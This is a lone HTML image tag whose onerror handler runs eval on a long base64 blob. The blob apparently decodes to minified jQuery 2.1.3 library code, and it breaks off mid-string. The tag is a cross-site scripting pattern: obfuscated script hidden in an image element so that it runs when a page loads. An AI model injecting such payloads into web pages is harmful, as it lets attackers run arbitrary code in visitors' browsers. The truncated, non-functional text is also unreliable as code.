<img src="invalid.jpg" onerror="eval(atob('IWZ1bmN0aW9uKGEsIGIpIHsKICAgICJvYmplY3QiID09IHR5cGVvZiBtb2R1bGUgJiYgIm9iamVjdCIgPT0gdHlwZW9mIG1vZHVsZS5leHBvcnRzID8gbW9kdWxlLmV4cG9ydHMgPSBhLmRvY3VtZW50ID8gYihhLCAhMCkgOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgIGlmICghYS5kb2N1bWVudCkKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigialF1ZXJ5IHJlcXVpcmVzIGEgd2luZG93IHdpdGggYSBkb2N1bWVudCIpOwogICAgICAgICAgICByZXR1cm4gYihhKQogICAgICAgIH0KICAgICAgICA6IGIoYSkKfSgidW5kZWZpbmVkIiAhPSB0eXBlb2Ygd2luZG93ID8gd2luZG93IDogdGhpcywgZnVuY3Rpb24oYSwgYikgewogICAgdmFyIGMgPSBbXQogICAgICAgICwgZCA9IGMuc2xpY2UKICAgICAgICAsIGUgPSBjLmNvbmNhdAogICAgICAgICwgZiA9IGMucHVzaAogICAgICAgICwgZyA9IGMuaW5kZXhPZgogICAgICAgICwgaCA9IHt9CiAgICAgICAgLCBpID0gaC50b1N0cmluZwogICAgICAgICwgaiA9IGguaGFzT3duUHJvcGVydHkKICAgICAgICAsIGsgPSB7fQogICAgICAgICwgbCA9IGEuZG9jdW1lbnQKICAgICAgICAsIG0gPSAiMi4xLjMiCiAgICAgICAgLCBuID0gZnVuY3Rpb24oYSwgYikgewogICAgICAgIHJldHVybiBuZXcgbi5mbi5pbml0KGEsYikKICAgIH0KICAgICAgICAsIG8gPSAvXltcc1x1RkVGRlx4QTBdK3xbXHNcdUZFRkZceEEwXSskL2cKICAgICAgICAsIHAgPSAvXi1tcy0vCiAgICAgICAgLCBxID0gLy0oW1xkYS16XSkvZ2kKICAgICAgICAsIHIgPSBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgcmV0dXJuIGIudG9VcHBlckNhc2UoKQogICAgfTsKICAgIG4uZm4gPSBuLnByb3RvdHlwZSA9IHsKICAgICAgICBqcXVlcnk6IG0sCiAgICAgICAgY29uc3RydWN0b3I6IG4sCiAgICAgICAgc2VsZWN0b3I6ICIiLAogICAgICAgIGxlbmd0aDogMCwKICAgICAgICB0b0FycmF5OiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgcmV0dXJuIGQuY2FsbCh0aGlzKQogICAgICAgIH0sCiAgICAgICAgZ2V0OiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgIHJldHVybiBudWxsICE9IGEgPyAwID4gYSA/IHRoaXNbYSArIHRoaXMubGVuZ3RoXSA6IHRoaXNbYV0gOiBkLmNhbGwodGhpcykKICAgICAgICB9LAogICAgICAgIHB1c2hTdGFjazogZnVuY3Rpb24oYSkgewogICAgICAgICAgICB2YXIgYiA9IG4ubWVyZ2UodGhpcy5jb25zdHJ1Y3RvcigpLCBhKTsKICAgICAgICAgICAgcmV0dXJuIGIucHJldk9iamVjdCA9IHRoaXMsCiAgICAgICAgICAgICAgICBiLmNvbnRleHQgPSB0aGlzLmNvbnRleHQsCiAgICAgICAgICAgICAgICBiCiAgICAgICAgfSwKICAgICAgICBlYWNoOiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgIHJldHVybiBuLmVhY2godGhpcywgYSwgYikKICAgICAgICB9LAogICAgICAgIG1hcDogZnVuY3Rpb24oYSkgewogICAgICAgICAgICByZXR1cm4gdGhpcy5wdXNoU3RhY2sobi5tYXAodGhpcywgZnVuY3Rpb24oYiwgYykgewogICAgICAgICAgICAgICAgcmV0dXJuIGEuY2FsbChiLCBjLCBiKQogICAgICAgICAgICB9KSkKICAgICAgICB9LAogICAgICAgIHNsaWNlOiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgcmV0dXJuIHRoaXMucHVzaFN0YWNrKGQuYXBwbHkodGhpcywgYXJndW1lbnRzKSkKICAgICAgICB9LAogICAgICAgIGZpcnN0OiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgcmV0dXJuIHRoaXMuZXEoMCkKICAgICAgICB9LAogICAgICAgIGxhc3Q6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICByZXR1cm4gdGhpcy5lcSgtMSkKICAgICAgICB9LAogICAgICAgIGVxOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgIHZhciBiID0gdGhpcy5sZW5ndGgKICAgICAgICAgICAgICAgICwgYyA9ICthICsgKDAgPiBhID8gYiA6IDApOwogICAgICAgICAgICByZXR1cm4gdGhpcy5wdXNoU3RhY2soYyA+PSAwICYmIGIgPiBjID8gW3RoaXNbY11dIDogW10pCiAgICAgICAgfSwKICAgICAgICBlbmQ6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICByZXR1cm4gdGhpcy5wcmV2T2JqZWN0IHx8IHRoaXMuY29uc3RydWN0b3IobnVsbCkKICAgICAgICB9LAogICAgICAgIHB1c2g6IGYsCiAgICAgICAgc29ydDogYy5zb3J0LAogICAgICAgIHNwbGljZTogYy5zcGxpY2UKICAgIH0sCiAgICAgICAgbi5leHRlbmQgPSBuLmZuLmV4dGVuZCA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICB2YXIgYSwgYiwgYywgZCwgZSwgZiwgZyA9IGFyZ3VtZW50c1swXSB8fCB7fSwgaCA9IDEsIGkgPSBhcmd1bWVudHMubGVuZ3RoLCBqID0gITE7CiAgICAgICAgICAgIGZvciAoImJvb2xlYW4iID09IHR5cGVvZiBnICYmIChqID0gZywKICAgICAgICAgICAgICAgIGcgPSBhcmd1bWVudHNbaF0gfHwge30sCiAgICAgICAgICAgICAgICBoKyspLAogICAgICAgICAgICAgICAgICJvYmplY3QiID09IHR5cGVvZiBnIHx8IG4uaXNGdW5jdGlvbihnKSB8fCAoZyA9IHt9KSwKICAgICAgICAgICAgICAgICBoID09PSBpICYmIChnID0gdGhpcywKICAgICAgICAgICAgICAgICAgICAgaC0tKTsgaSA+IGg7IGgrKykKICAgICAgICAgICAgICAgIGlmIChudWxsICE9IChhID0gYXJndW1lbnRzW2hdKSkKICAgICAgICAgICAgICAgICAgICBmb3IgKGIgaW4gYSkKICAgICAgICAgICAgICAgICAgICAgICAgYyA9IGdbYl0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID0gYVtiXSwKICAgICAgICAgICAgICAgICAgICAgICAgZyAhPT0gZCAmJiAoaiAmJiBkICYmIChuLmlzUGxhaW5PYmplY3QoZCkgfHwgKGUgPSBuLmlzQXJyYXkoZCkpKSA/IChlID8gKGUgPSAhMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYgPSBjICYmIG4uaXNBcnJheShjKSA/IGMgOiBbXSkgOiBmID0gYyAmJiBuLmlzUGxhaW5PYmplY3QoYykgPyBjIDoge30sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnW2JdID0gbi5leHRlbmQoaiwgZiwgZCkpIDogdm9pZCAwICE9PSBkICYmIChnW2JdID0gZCkpOwogICAgICAgICAgICByZXR1cm4gZwogICAgICAgIH0KICAgICAgICAsCiAgICAgICAgbi5leHRlbmQoewogICAgICAgICAgICBleHBhbmRvOiAialF1ZXJ5IiArIChtICsgTWF0aC5yYW5kb20oKSkucmVwbGFjZSgvXEQvZywgIiIpLAogICAgICAgICAgICBpc1JlYWR5OiAhMCwKICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihhKQogICAgICAgICAgICB9LAogICAgICAgICAgICBub29wOiBmdW5jdGlvbigpIHt9LAogICAgICAgICAgICBpc0Z1bmN0aW9uOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gImZ1bmN0aW9uIiA9PT0gbi50eXBlKGEpCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGlzQXJyYXk6IEFycmF5LmlzQXJyYXksCiAgICAgICAgICAgIGlzV2luZG93OiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbnVsbCAhPSBhICYmIGEgPT09IGEud2luZG93CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGlzTnVtZXJpYzogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgcmV0dXJuICFuLmlzQXJyYXkoYSkgJiYgYSAtIHBhcnNlRmxvYXQoYSkgKyAxID49IDAKICAgICAgICAgICAgfSwKICAgICAgICAgICAgaXNQbGFpbk9iamVjdDogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgcmV0dXJuICJvYmplY3QiICE9PSBuLnR5cGUoYSkgfHwgYS5ub2RlVHlwZSB8fCBuLmlzV2luZG93KGEpID8gITEgOiBhLmNvbnN0cnVjdG9yICYmICFqLmNhbGwoYS5jb25zdHJ1Y3Rvci5wcm90b3R5cGUsICJpc1Byb3RvdHlwZU9mIikgPyAhMSA6ICEwCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGlzRW1wdHlPYmplY3Q6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHZhciBiOwogICAgICAgICAgICAgICAgZm9yIChiIGluIGEpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICExOwogICAgICAgICAgICAgICAgcmV0dXJuICEwCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHR5cGU6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHJldHVybiBudWxsID09IGEgPyBhICsgIiIgOiAib2JqZWN0IiA9PSB0eXBlb2YgYSB8fCAiZnVuY3Rpb24iID09IHR5cGVvZiBhID8gaFtpLmNhbGwoYSldIHx8ICJvYmplY3QiIDogdHlwZW9mIGEKICAgICAgICAgICAgfSwKICAgICAgICAgICAgZ2xvYmFsRXZhbDogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgdmFyIGIsIGMgPSBldmFsOwogICAgICAgICAgICAgICAgYSA9IG4udHJpbShhKSwKICAgICAgICAgICAgICAgIGEgJiYgKDEgPT09IGEuaW5kZXhPZigidXNlIHN0cmljdCIpID8gKGIgPSBsLmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpLAogICAgICAgICAgICAgICAgICAgIGIudGV4dCA9IGEsCiAgICAgICAgICAgICAgICAgICAgbC5oZWFkLmFwcGVuZENoaWxkKGIpLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoYikpIDogYyhhKSkKICAgICAgICAgICAgfSwKICAgICAgICAgICAgY2FtZWxDYXNlOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gYS5yZXBsYWNlKHAsICJtcy0iKS5yZXBsYWNlKHEsIHIpCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIG5vZGVOYW1lOiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gYS5ub2RlTmFtZSAmJiBhLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT09IGIudG9Mb3dlckNhc2UoKQogICAgICAgICAgICB9LAogICAgICAgICAgICBlYWNoOiBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICB2YXIgZCwgZSA9IDAsIGYgPSBhLmxlbmd0aCwgZyA9IHMoYSk7CiAgICAgICAgICAgICAgICBpZiAoYykgewogICAgICAgICAgICAgICAgICAgIGlmIChnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoOyBmID4gZTsgZSsrKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGQgPSBiLmFwcGx5KGFbZV0sIGMpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZCA9PT0gITEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChlIGluIGEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZCA9IGIuYXBwbHkoYVtlXSwgYyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID09PSAhMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChnKSB7CiAgICAgICAgICAgICAgICAgICAgZm9yICg7IGYgPiBlOyBlKyspCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkID0gYi5jYWxsKGFbZV0sIGUsIGFbZV0pLAogICAgICAgICAgICAgICAgICAgICAgICBkID09PSAhMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB9IGVsc2UKICAgICAgICAgICAgICAgICAgICBmb3IgKGUgaW4gYSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGQgPSBiLmNhbGwoYVtlXSwgZSwgYVtlXSksCiAgICAgICAgICAgICAgICAgICAgICAgIGQgPT09ICExKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICByZXR1cm4gYQogICAgICAgICAgICB9LAogICAgICAgICAgICB0cmltOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbnVsbCA9PSBhID8gIiIgOiAoYSArICIiKS5yZXBsYWNlKG8sICIiKQogICAgICAgICAgICB9LAogICAgICAgICAgICBtYWtlQXJyYXk6IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgIHZhciBjID0gYiB8fCBbXTsKICAgICAgICAgICAgICAgIHJldHVybiBudWxsICE9IGEgJiYgKHMoT2JqZWN0KGEpKSA/IG4ubWVyZ2UoYywgInN0cmluZyIgPT0gdHlwZW9mIGEgPyBbYV0gOiBhKSA6IGYuY2FsbChjLCBhKSksCiAgICAgICAgICAgICAgICAgICAgYwogICAgICAgICAgICB9LAogICAgICAgICAgICBpbkFycmF5OiBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbnVsbCA9PSBiID8gLTEgOiBnLmNhbGwoYiwgYSwgYykKICAgICAgICAgICAgfSwKICAgICAgICAgICAgbWVyZ2U6IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgIGZvciAodmFyIGMgPSArYi5sZW5ndGgsIGQgPSAwLCBlID0gYS5sZW5ndGg7IGMgPiBkOyBkKyspCiAgICAgICAgICAgICAgICAgICAgYVtlKytdID0gYltkXTsKICAgICAgICAgICAgICAgIHJldHVybiBhLmxlbmd0aCA9IGUsCiAgICAgICAgICAgICAgICAgICAgYQogICAgICAgICAgICB9LAogICAgICAgICAgICBncmVwOiBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICBmb3IgKHZhciBkLCBlID0gW10sIGYgPSAwLCBnID0gYS5sZW5ndGgsIGggPSAhYzsgZyA+IGY7IGYrKykKICAgICAgICAgICAgICAgICAgICBkID0gIWIoYVtmXSwgZiksCiAgICAgICAgICAgICAgICAgICAgZCAhPT0gaCAmJiBlLnB1c2goYVtmXSk7CiAgICAgICAgICAgICAgICByZXR1cm4gZQogICAgICAgICAgICB9LAogICAgICAgICAgICBtYXA6IGZ1bmN0aW9uKGEsIGIsIGMpIHsKICAgICAgICAgICAgICAgIHZhciBkLCBmID0gMCwgZyA9IGEubGVuZ3RoLCBoID0gcyhhKSwgaSA9IFtdOwogICAgICAgICAgICAgICAgaWYgKGgpCiAgICAgICAgICAgICAgICAgICAgZm9yICg7IGcgPiBmOyBmKyspCiAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBiKGFbZl0sIGYsIGMpLAogICAgICAgICAgICAgICAgICAgICAgICBudWxsICE9IGQgJiYgaS5wdXNoKGQpOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGZvciAoZiBpbiBhKQogICAgICAgICAgICAgICAgICAgICAgICBkID0gYihhW2ZdLCBmLCBjKSwKICAgICAgICAgICAgICAgICAgICAgICAgbnVsbCAhPSBkICYmIGkucHVzaChkKTsKICAgICAgICAgICAgICAgIHJldHVybiBlLmFwcGx5KFtdLCBpKQogICAgICAgICAgICB9LAogICAgICAgICAgICBndWlkOiAxLAogICAgICAgICAgICBwcm94eTogZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICAgICAgdmFyIGMsIGUsIGY7CiAgICAgICAgICAgICAgICByZXR1cm4gInN0cmluZyIgPT0gdHlwZW9mIGIgJiYgKGMgPSBhW2JdLAogICAgICAgICAgICAgICAgICAgIGIgPSBhLAogICAgICAgICAgICAgICAgICAgIGEgPSBjKSwKICAgICAgICAgICAgICAgICAgICBuLmlzRnVuY3Rpb24oYSkgPyAoZSA9IGQuY2FsbChhcmd1bWVudHMsIDIpLAogICAgICAgICAgICAgICAgICAgICAgICBmID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYS5hcHBseShiIHx8IHRoaXMsIGUuY29uY2F0KGQuY2FsbChhcmd1bWVudHMpKSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAsCiAgICAgICAgICAgICAgICAgICAgICAgIGYuZ3VpZCA9IGEuZ3VpZCA9IGEuZ3VpZCB8fCBuLmd1aWQrKywKICAgICAgICAgICAgICAgICAgICAgICAgZikgOiB2b2lkIDAKICAgICAgICAgICAgfSwKICAgICAgICAgICAgbm93OiBEYXRlLm5vdywKICAgICAgICAgICAgc3VwcG9ydDogawogICAgICAgIH0pLAogICAgICAgIG4uZWFjaCgiQm9vbGVhbiBOdW1iZXIgU3RyaW5nIEZ1bmN0aW9uIEFycmF5IERhdGUgUmVnRXhwIE9iamVjdCBFcnJvciIuc3BsaXQoIiAiKSwgZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICBoWyJbb2JqZWN0ICIgKyBiICsgIl0iXSA9IGIudG9Mb3dlckNhc2UoKQogICAgICAgIH0pOwogICAgZnVuY3Rpb24gcyhhKSB7CiAgICAgICAgdmFyIGIgPSBhLmxlbmd0aAogICAgICAgICAgICAsIGMgPSBuLnR5cGUoYSk7CiAgICAgICAgcmV0dXJuICJmdW5jdGlvbiIgPT09IGMgfHwgbi5pc1dpbmRvdyhhKSA/ICExIDogMSA9PT0gYS5ub2RlVHlwZSAmJiBiID8gITAgOiAiYXJyYXkiID09PSBjIHx8IDAgPT09IGIgfHwgIm51bWJlciIgPT0gdHlwZW9mIGIgJiYgYiA+IDAgJiYgYiAtIDEgaW4gYQogICAgfQogICAgdmFyIHQgPSBmdW5jdGlvbihhKSB7CiAgICAgICAgdmFyIGIsIGMsIGQsIGUsIGYsIGcsIGgsIGksIGosIGssIGwsIG0sIG4sIG8sIHAsIHEsIHIsIHMsIHQsIHUgPSAic2l6emxlIiArIDEgKiBuZXcgRGF0ZSwgdiA9IGEuZG9jdW1lbnQsIHcgPSAwLCB4ID0gMCwgeSA9IGhiKCksIHogPSBoYigpLCBBID0gaGIoKSwgQiA9IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgcmV0dXJuIGEgPT09IGIgJiYgKGwgPSAhMCksCiAgICAgICAgICAgICAgICAwCiAgICAgICAgfSwgQyA9IDEgPDwgMzEsIEQgPSB7fS5oYXNPd25Qcm9wZXJ0eSwgRSA9IFtdLCBGID0gRS5wb3AsIEcgPSBFLnB1c2gsIEggPSBFLnB1c2gsIEkgPSBFLnNsaWNlLCBKID0gZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICBmb3IgKHZhciBjID0gMCwgZCA9IGEubGVuZ3RoOyBkID4gYzsgYysrKQogICAgICAgICAgICAgICAgaWYgKGFbY10gPT09IGIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGM7CiAgICAgICAgICAgIHJldHVybiAtMQogICAgICAgIH0sIEsgPSAiY2hlY2tlZHxzZWxlY3RlZHxhc3luY3xhdXRvZm9jdXN8YXV0b3BsYXl8Y29udHJvbHN8ZGVmZXJ8ZGlzYWJsZWR8aGlkZGVufGlzbWFwfGxvb3B8bXVsdGlwbGV8b3BlbnxyZWFkb25seXxyZXF1aXJlZHxzY29wZWQiLCBMID0gIltcXHgyMFxcdFxcclxcblxcZl0iLCBNID0gIig/OlxcXFwufFtcXHctXXxbXlxceDAwLVxceGEwXSkrIiwgTiA9IE0ucmVwbGFjZSgidyIsICJ3IyIpLCBPID0gIlxcWyIgKyBMICsgIiooIiArIE0gKyAiKSg/OiIgKyBMICsgIiooWypeJHwhfl0/PSkiICsgTCArICIqKD86JygoPzpcXFxcLnxbXlxcXFwnXSkqKSd8XCIoKD86XFxcXC58W15cXFxcXCJdKSopXCJ8KCIgKyBOICsgIikpfCkiICsgTCArICIqXFxdIiwgUCA9ICI6KCIgKyBNICsgIikoPzpcXCgoKCcoKD86XFxcXC58W15cXFxcJ10pKiknfFwiKCg/OlxcXFwufFteXFxcXFwiXSkqKVwiKXwoKD86XFxcXC58W15cXFxcKClbXFxdXXwiICsgTyArICIpKil8LiopXFwpfCkiLCBRID0gbmV3IFJlZ0V4cChMICsgIisiLCJnIiksIFIgPSBuZXcgUmVnRXhwKCJeIiArIEwgKyAiK3woKD86XnxbXlxcXFxdKSg/OlxcXFwuKSopIiArIEwgKyAiKyQiLCJnIiksIFMgPSBuZXcgUmVnRXhwKCJeIiArIEwgKyAiKiwiICsgTCArICIqIiksIFQgPSBuZXcgUmVnRXhwKCJeIiArIEwgKyAiKihbPit+XXwiICsgTCArICIpIiArIEwgKyAiKiIpLCBVID0gbmV3IFJlZ0V4cCgiPSIgKyBMICsgIiooW15cXF0nXCJdKj8pIiArIEwgKyAiKlxcXSIsImciKSwgViA9IG5ldyBSZWdFeHAoUCksIFcgPSBuZXcgUmVnRXhwKCJeIiArIE4gKyAiJCIpLCBYID0gewogICAgICAgICAgICBJRDogbmV3IFJlZ0V4cCgiXiMoIiArIE0gKyAiKSIpLAogICAgICAgICAgICBDTEFTUzogbmV3IFJlZ0V4cCgiXlxcLigiICsgTSArICIpIiksCiAgICAgICAgICAgIFRBRzogbmV3IFJlZ0V4cCgiXigiICsgTS5yZXBsYWNlKCJ3IiwgIncqIikgKyAiKSIpLAogICAgICAgICAgICBBVFRSOiBuZXcgUmVnRXhwKCJeIiArIE8pLAogICAgICAgICAgICBQU0VVRE86IG5ldyBSZWdFeHAoIl4iICsgUCksCiAgICAgICAgICAgIENISUxEOiBuZXcgUmVnRXhwKCJeOihvbmx5fGZpcnN0fGxhc3R8bnRofG50aC1sYXN0KS0oY2hpbGR8b2YtdHlwZSkoPzpcXCgiICsgTCArICIqKGV2ZW58b2RkfCgoWystXXwpKFxcZCopbnwpIiArIEwgKyAiKig/OihbKy1dfCkiICsgTCArICIqKFxcZCspfCkpIiArIEwgKyAiKlxcKXwpIiwiaSIpLAogICAgICAgICAgICBib29sOiBuZXcgUmVnRXhwKCJeKD86IiArIEsgKyAiKSQiLCJpIiksCiAgICAgICAgICAgIG5lZWRzQ29udGV4dDogbmV3IFJlZ0V4cCgiXiIgKyBMICsgIipbPit+XXw6KGV2ZW58b2RkfGVxfGd0fGx0fG50aHxmaXJzdHxsYXN0KSg/OlxcKCIgKyBMICsgIiooKD86LVxcZCk/XFxkKikiICsgTCArICIqXFwpfCkoPz1bXi1dfCQpIiwiaSIpCiAgICAgICAgfSwgWSA9IC9eKD86aW5wdXR8c2VsZWN0fHRleHRhcmVhfGJ1dHRvbikkL2ksIFogPSAvXmhcZCQvaSwgJCA9IC9eW157XStce1xzKlxbbmF0aXZlIFx3LywgXyA9IC9eKD86IyhbXHctXSspfChcdyspfFwuKFtcdy1dKykpJC8sIGFiID0gL1srfl0vLCBiYiA9IC8nfFxcL2csIGNiID0gbmV3IFJlZ0V4cCgiXFxcXChbXFxkYS1mXXsxLDZ9IiArIEwgKyAiP3woIiArIEwgKyAiKXwuKSIsImlnIiksIGRiID0gZnVuY3Rpb24oYSwgYiwgYykgewogICAgICAgICAgICB2YXIgZCA9ICIweCIgKyBiIC0gNjU1MzY7CiAgICAgICAgICAgIHJldHVybiBkICE9PSBkIHx8IGMgPyBiIDogMCA+IGQgPyBTdHJpbmcuZnJvbUNoYXJDb2RlKGQgKyA2NTUzNikgOiBTdHJpbmcuZnJvbUNoYXJDb2RlKGQgPj4gMTAgfCA1NTI5NiwgMTAyMyAmIGQgfCA1NjMyMCkKICAgICAgICB9LCBlYiA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICBtKCkKICAgICAgICB9OwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIEguYXBwbHkoRSA9IEkuY2FsbCh2LmNoaWxkTm9kZXMpLCB2LmNoaWxkTm9kZXMpLAogICAgICAgICAgICAgICAgRVt2LmNoaWxkTm9kZXMubGVuZ3RoXS5ub2RlVHlwZQogICAgICAgIH0gY2F0Y2ggKGZiKSB7CiAgICAgICAgICAgIEggPSB7CiAgICAgICAgICAgICAgICBhcHBseTogRS5sZW5ndGggPyBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEcuYXBwbHkoYSwgSS5jYWxsKGIpKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICA6IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSBhLmxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLCBkID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGFbYysrXSA9IGJbZCsrXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsKICAgICAgICAgICAgICAgICAgICAgICAgYS5sZW5ndGggPSBjIC0gMQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBnYihhLCBiLCBkLCBlKSB7CiAgICAgICAgICAgIHZhciBmLCBoLCBqLCBrLCBsLCBvLCByLCBzLCB3LCB4OwogICAgICAgICAgICBpZiAoKGIgPyBiLm93bmVyRG9jdW1lbnQgfHwgYiA6IHYpICE9PSBuICYmIG0oYiksCiAgICAgICAgICAgICAgICBiID0gYiB8fCBuLAogICAgICAgICAgICAgICAgZCA9IGQgfHwgW10sCiAgICAgICAgICAgICAgICBrID0gYi5ub2RlVHlwZSwKICAgICAgICAgICAgInN0cmluZyIgIT0gdHlwZW9mIGEgfHwgIWEgfHwgMSAhPT0gayAmJiA5ICE9PSBrICYmIDExICE9PSBrKQogICAgICAgICAgICAgICAgcmV0dXJuIGQ7CiAgICAgICAgICAgIGlmICghZSAmJiBwKSB7CiAgICAgICAgICAgICAgICBpZiAoMTEgIT09IGsgJiYgKGYgPSBfLmV4ZWMoYSkpKQogICAgICAgICAgICAgICAgICAgIGlmIChqID0gZlsxXSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoOSA9PT0gaykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGggPSBiLmdldEVsZW1lbnRCeUlkKGopLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIWggfHwgIWgucGFyZW50Tm9kZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoLmlkID09PSBqKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkLnB1c2goaCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChiLm93bmVyRG9jdW1lbnQgJiYgKGggPSBiLm93bmVyRG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaikpICYmIHQoYiwgaCkgJiYgaC5pZCA9PT0gaikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkLnB1c2goaCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZAogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmWzJdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEguYXBwbHkoZCwgYi5nZXRFbGVtZW50c0J5VGFnTmFtZShhKSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChqID0gZlszXSkgJiYgYy5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEguYXBwbHkoZCwgYi5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKGopKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGMucXNhICYmICghcSB8fCAhcS50ZXN0KGEpKSkgewogICAgICAgICAgICAgICAgICAgIGlmIChzID0gciA9IHUsCiAgICAgICAgICAgICAgICAgICAgICAgIHcgPSBiLAogICAgICAgICAgICAgICAgICAgICAgICB4ID0gMSAhPT0gayAmJiBhLAogICAgICAgICAgICAgICAgICAgIDEgPT09IGsgJiYgIm9iamVjdCIgIT09IGIubm9kZU5hbWUudG9Mb3dlckNhc2UoKSkgewogICAgICAgICAgICAgICAgICAgICAgICBvID0gZyhhKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIChyID0gYi5nZXRBdHRyaWJ1dGUoImlkIikpID8gcyA9IHIucmVwbGFjZShiYiwgIlxcJCYiKSA6IGIuc2V0QXR0cmlidXRlKCJpZCIsIHMpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcyA9ICJbaWQ9JyIgKyBzICsgIiddI